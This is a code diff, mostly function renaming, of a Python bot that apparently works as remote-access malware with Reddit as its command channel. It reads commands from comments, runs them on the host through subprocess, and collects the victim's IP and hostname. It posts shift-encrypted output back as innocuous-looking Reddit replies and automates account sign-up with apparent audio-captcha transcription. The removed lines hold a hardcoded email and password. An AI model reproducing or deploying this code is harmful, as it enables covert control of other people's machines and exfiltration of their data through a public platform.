@@ -21,15 +21,11 @@ import socket
 import hashlib
 import json
 
-# global parameters
-AudioSegment.converter = r'ffmpeg.exe'
-AudioSegment.ffmpeg = r'ffmpeg.exe'
-AudioSegment.ffprobe = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffprobe.exe'
-
+# global variables
 PATH = r'chromedriver.exe'
 
 
-def shiftEncrypt(message, shift):
+def shift_encrypt(message, shift):
     encrypted_message = ''
     for char in message:
         if char.isalpha():
@@ -42,7 +38,7 @@ def shiftEncrypt(message, shift):
     return encrypted_message
 
 
-def writeListToFile(key, list):
+def write_list_to_file(key, list):
     with open('config.json', 'r') as openfile:
         dictionary = json.load(openfile)
     dictionary[key] = list
@@ -75,14 +71,11 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
 
         try:
             if not os.path.isfile("config.json"):
-                # self.signUpToReddit()
-                #TODO: DELETE THIS
-                self.login_email = "sdfjhfs@gmail.com"
-                self.login_password = "Happy!M72q"
-                self.login_username = "Holiday_Marketing_72"
+                self.sign_up_to_reddit()
                 login = "{},{},{}".format(self.login_email, self.login_username, self.login_password)
                 dictionary = {"login": login, "prev_comments": [], "rpDoneTasks": []}
                 json_object = json.dumps(dictionary, indent=3)
+
                 with open("config.json", "w") as outfile:
                     outfile.write(json_object)
 
@@ -93,32 +86,35 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
                 self.login_email = login_data[0]
                 self.login_username = login_data[1]
                 self.login_password = login_data[2]
+
                 try:
                     self.prev_comments = dictionary["prev_comments"]
                     self.rpDoneTasks = dictionary["rpDoneTasks"]
+
                 except Exception as e:
                     print(e)
+
         except Exception as e:
             print(e)
 
-    # def start(self):
-    #     print("here")
-    #     if os.path.isfile("config.json"):
-    #         try:
-    #             data = self.prev_comments[-1][1]
-    #             if len(data) > 0:
-    #                 return self.GetNextCommand(data[0], data[1], data[2], data[3])
-    #         except:
-    #             pass
-    #
-    #     return self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
+    def start(self):
 
-    def getVictimInfo(self):
+        if os.path.isfile("config.json"):
+            try:
+                data = self.prev_comments[-1][1]
+                if len(data) > 0:
+                    return self.get_next_command(data[0], data[1], data[2], data[3])
+            except:
+                pass
+
+        return self.get_next_command(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
+
+    def get_victim_info(self):
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         return "{}@{}".format(IPAddr, hostname)
 
-    def writeBack(self, data, err, browser, commentURL):
+    def write_back(self, data, err, browser, commentURL):
         # load the comment URL
         browser.get(commentURL)
 
@@ -128,16 +124,15 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         time.sleep(8)
 
         # reply of the comment
-        button = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, f'//*[@id="t1_{id}"]/div[2]/div[3]/div[3]/div[2]/button[1]')))
-        button.click()
+        WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, f'//*[@id="t1_{id}"]/div[2]/div[3]/div[3]/div[2]/button[1]'))).click()
 
         time.sleep(2)
 
         # insert to data to the reply
         if len(self.victimInfo) == 0:
-            self.victimInfo = self.getVictimInfo()
+            self.victimInfo = self.get_victim_info()
         enc = "{} {} {}".format(data, err, self.victimInfo)
-        enc = shiftEncrypt(enc, 16)
+        enc = shift_encrypt(enc, 16)
         replyData = """It's so correct!!
     send you big like XOXO
     {}""".format(enc)
@@ -177,11 +172,11 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         time.sleep(4)
 
 
-    def CommandHandle(self, cmd, parameters, browser=None, dataToSave="", commentURL=""):
+    def command_handle(self, cmd, parameters, browser=None, dataToSave="", commentURL=""):
         result = hashlib.md5(dataToSave.encode('utf_8')).hexdigest()
         if cmd == "pm" and result not in self.rpDoneTasks:
             self.rpDoneTasks.insert(0, result)
-            writeListToFile("rpDoneTasks", self.rpDoneTasks)
+            write_list_to_file("rpDoneTasks", self.rpDoneTasks)
             root = tk.Tk()
             root.title("Message from Reddit-Bot")
             root.geometry("400x200")
@@ -195,11 +190,11 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         if cmd == "rp" and result not in self.rpDoneTasks:
             res = subprocess.Popen(parameters, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             data, err = res.communicate()
-            self.writeBack(data, err, browser, commentURL)
+            self.write_back(data, err, browser, commentURL)
             self.rpDoneTasks.insert(0, result)
-            writeListToFile("rpDoneTasks", self.rpDoneTasks)
+            write_list_to_file("rpDoneTasks", self.rpDoneTasks)
 
-    def GetNextCommand(self, sub_reddit, key1, key2, key3):
+    def get_next_command(self, sub_reddit, key1, key2, key3):
         # set parameters for web driver
         parameters = webdriver.ChromeOptions()
         parameters.headless = False  # display a user interface
@@ -266,7 +261,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
                 comment_url = href.split('?')[0]
                 self.prev_comments.append((comment_url, [sub_reddit, key1, key2, key3]))
                 try:
-                    writeListToFile("prev_comments", self.prev_comments)
+                    write_list_to_file("prev_comments", self.prev_comments)
                 except Exception as e:
                     print(e)
 
@@ -289,11 +284,11 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
 
                         # execute the command in a new thread so the bot continue to run and while the command work on
                         if cmd == "pm":
-                            t = Thread(target=self.CommandHandle, args=(cmd, parameters, None, dataToSave))
+                            t = Thread(target=self.command_handle, args=(cmd, parameters, None, dataToSave))
                             t.start()
 
                         else:
-                            self.CommandHandle(cmd, parameters, browser, dataToSave, comment_url)
+                            self.command_handle(cmd, parameters, browser, dataToSave, comment_url)
 
                 # get next keys
                 pattern = r"{} {} {}\s+(\w+\s+\w+\s+\w+\s+\w+)".format(key1, key2, key3)
@@ -320,7 +315,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         browser.quit()
         return status, None
 
-    def GoBack(self):
+    def go_back(self):
         # set parameters for web driver
         parameters = webdriver.ChromeOptions()
         parameters.headless = False
@@ -374,7 +369,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         # if all prev comments corrupted, use the bootstrap
         browser.quit()
         self.prev_comments = tempCommentsList
-        status, next_keys = self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
+        status, next_keys = self.get_next_command(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
         return status, next_keys
 
     def transcribe(self, url):
@@ -397,11 +392,13 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         with sr.AudioFile(voiceFileNameWav) as source:
             # listen for the data (load audio to memory)
             audio_data = r.listen(source)
+
             # recognize (convert from speech to text)
             text = r.recognize_google(audio_data)
+
         return text
 
-    def signUpToReddit(self):
+    def sign_up_to_reddit(self):
         # set parameters for web driver
         parameters = uc.ChromeOptions()
         parameters.headless = False  # display a user interface
